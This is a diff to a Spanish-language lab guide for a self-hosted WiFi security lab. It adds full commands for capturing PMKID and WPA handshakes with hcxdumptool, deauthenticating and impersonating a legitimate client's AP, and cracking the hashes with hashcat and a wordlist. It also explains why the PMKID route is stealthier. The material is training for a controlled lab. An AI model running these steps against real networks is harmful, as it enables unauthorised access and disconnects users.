@@ -342,21 +342,102 @@ KCK = primeros 128 bits de la PTK      (clave para el MIC)
 Hay una estación asociada generando tráfico. Sirve para contrastar las **dos
 vías**: capturar el PMKID (campo del M1) o el handshake 4-way tras un deauth.
 
+Con hcxtools se consiguen las dos vías en una sola captura: hcxdumptool
+captura PMKID y handshakes a la vez.
+
+### a) Capturar con hcxdumptool (canal 11, solo este AP)
+
 ```bash
-sudo iw dev wlan0 set channel 11
+# Localizar el objetivo
+sudo airodump-ng wlan0mon --band g       # he_pmkid: CH 11, con una estación
+BSSID=<BSSID_PMKID>
 
-# Opción recomendada: hcxdumptool captura PMKID y handshakes a la vez
-sudo hcxdumptool -i wlan0 -w pmkid_cli.pcapng --rds=1
-# (Ctrl-C tras unos segundos)
+# Filtro BPF para no atacar los otros escenarios
+sudo hcxdumptool --bpfc="wlan addr3 $BSSID" > pmkid.bpf
 
-# Extraer el hash 22000 (contiene líneas WPA*01=PMKID y WPA*02=handshake)
-hcxpcapngtool -o hash_pmkid.22000 pmkid_cli.pcapng
+# Interfaz limpia: hcxdumptool la pone en monitor él solo
+sudo hcxdumptool -i wlan1 -c 11a --bpf=pmkid.bpf -w pmkid_cli.pcapng --rds=1
+```
 
-# Crackear
-hashcat -m 22000 hash_pmkid.22000 /usr/share/wordlists/rockyou.txt
+`pmkid.bpf` no forma parte del lab: lo genera `--bpfc` en la primera
+línea. Es el filtro compilado a bytecode BPF, en el mismo formato que
+`tcpdump -ddd`. `addr3` es el BSSID en las tramas de gestión y en el M1 del
+AP. El filtro es opcional, pero sin él hcxdumptool también ataca a los
+clientes de los otros escenarios del mismo canal.
+
+hcxdumptool hace dos cosas a la vez:
+
+- **Se asocia con el AP con una MAC inventada.** El AP le envía el M1 con el
+  PMKID, igual que en `he_pmkid_nc`.
+- **Ataca al cliente legítimo.** Lo desasocia y, cuando el cliente intenta
+  reconectar, consigue su M2. Puede capturar el 4-way completo contra el AP
+  real o hacerse pasar por el AP (pares *ROGUE*). En los dos casos el M2 lo
+  calcula el cliente con la **clave real**, así que su MIC sirve para
+  crackear. No es como el M2 de la contraseña falsa del método B de
+  `he_pmkid_nc`.
+
+En la pantalla salen **dos filas** para este AP:
+
+- **Con la MAC de hcxdumptool** en `MAC-CL`: columna `P` marcada (PMKID).
+- **Con la MAC del cliente real**: columnas `2` o `3` marcadas (handshake).
+
+Cuando estén las dos, **Ctrl+C**. Bastan unos segundos o un minuto. No hay que
+dejarlo corriendo: mientras está activo sigue desconectando al cliente.
+
+### b) Convertir y separar los dos tipos de hash
+
+```bash
+hcxpcapngtool -o pmkid_cli.22000 pmkid_cli.pcapng
+
+# Quedarse solo con he_pmkid (por si se ha colado otra red)
+hcxhashtool -i pmkid_cli.22000 --essid=he_pmkid -o solo_pmkid.22000
+
+grep -c '^WPA\*01' solo_pmkid.22000   # PMKID
+grep -c '^WPA\*02' solo_pmkid.22000   # handshake (M1+M2)
+```
+
+En el resumen de hcxpcapngtool:
+
+- `RSN PMKID written to 22000 hash file`: PMKID.
+- `EAPOL pairs written to 22000 hash file`: handshakes.
+- `EAPOL ROGUE pairs`: handshakes obtenidos haciéndose pasar por el AP.
+- `MAC ACCESS POINT ... (incremented on every new client)`: el AP falso del
+  propio hcxdumptool, no el del lab.
+
+Cada línea 22000 tiene el formato
+`WPA*<tipo>*<PMKID o MIC>*<MAC_AP>*<MAC_STA>*<ESSID en hex>*...`.
+
+### c) Crackear
+
+```bash
+hashcat -m 22000 solo_pmkid.22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 solo_pmkid.22000 --show
+```
+
+hashcat informa de `2 digests; 2 unique digests, 1 unique salts`: son dos
+hashes (PMKID y handshake) de la misma red, y el *salt* común es el ESSID.
+Los dos salen con la misma clave (`Recovered: 2/2`).
+
+Para demostrar que cada vía funciona por separado:
+
+```bash
+hcxhashtool -i solo_pmkid.22000 --type=1 -o solo_pmkid_01.22000   # solo PMKID
+hcxhashtool -i solo_pmkid.22000 --type=2 -o solo_pmkid_02.22000   # solo handshake
 ```
 
 **Resultado esperado:** `butterfly`.
+
+**Problema frecuente: hashcat termina sin probar nada** y muestra
+`Not enough allocatable device memory or free host memory for mapping`. La VM
+tiene poca RAM: PoCL solo deja reservar la mitad (por ejemplo `738/1477 MB`).
+Lo mejor es darle 4 GB a la VM. Si no es posible, reduce la carga:
+
+```bash
+hashcat -m 22000 solo_pmkid.22000 /usr/share/wordlists/rockyou.txt -n 1 -u 1 -T 1 -w 1
+```
+
+Si se prueba con un diccionario propio, comprueba que contiene la clave.
+hashcat no avisa: simplemente termina como `Exhausted`.
 
 ### Fundamento técnico
 
@@ -379,6 +460,14 @@ hashcat -m 22000 hash_pmkid.22000 /usr/share/wordlists/rockyou.txt
   conseguir el PMKID (asociándose uno mismo) o el handshake (deauth al
   cliente). hashcat las distingue en el formato 22000: `WPA*01` = PMKID,
   `WPA*02` = handshake.
+  - Para el **PMKID** basta con el M1 del AP. Lo calcula el AP con la PMK
+    real, sin importar quién se asocie.
+  - Para el **handshake** hacen falta M1 y M2. El MIC del M2 solo vale como
+    verificador si lo calcula alguien que conoce la clave, es decir, el
+    cliente legítimo. Por eso esta vía necesita un cliente y la del PMKID no.
+- **Ruido.** La vía del PMKID es sigilosa: solo hay una asociación del
+  atacante. La del handshake obliga a desconectar al cliente, que lo nota
+  como un corte breve y queda registrado en el AP.
 - **Nota del lab:** el hostapd de serie no incluye el PMKID en el M1 con
   WPA-PSK. Por eso los escenarios PMKID usan un hostapd parcheado
   (`compila_hostapd_pmkid.sh`), que reproduce el comportamiento de muchos
@@ -628,6 +717,7 @@ sudo ./limpia.sh
 ## Herramientas usadas
 
 - **aircrack-ng suite** (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)
-- **hcxdumptool / hcxpcapngtool** (captura y conversión de PMKID/handshake)
+- **hcxdumptool / hcxpcapngtool / hcxhashtool** (captura, conversión y
+  filtrado de PMKID/handshake)
 - **hashcat** (modo `22000` = WPA-PBKDF2-PMKID+EAPOL), en CPU mediante PoCL
 - **tshark** (análisis de capturas)
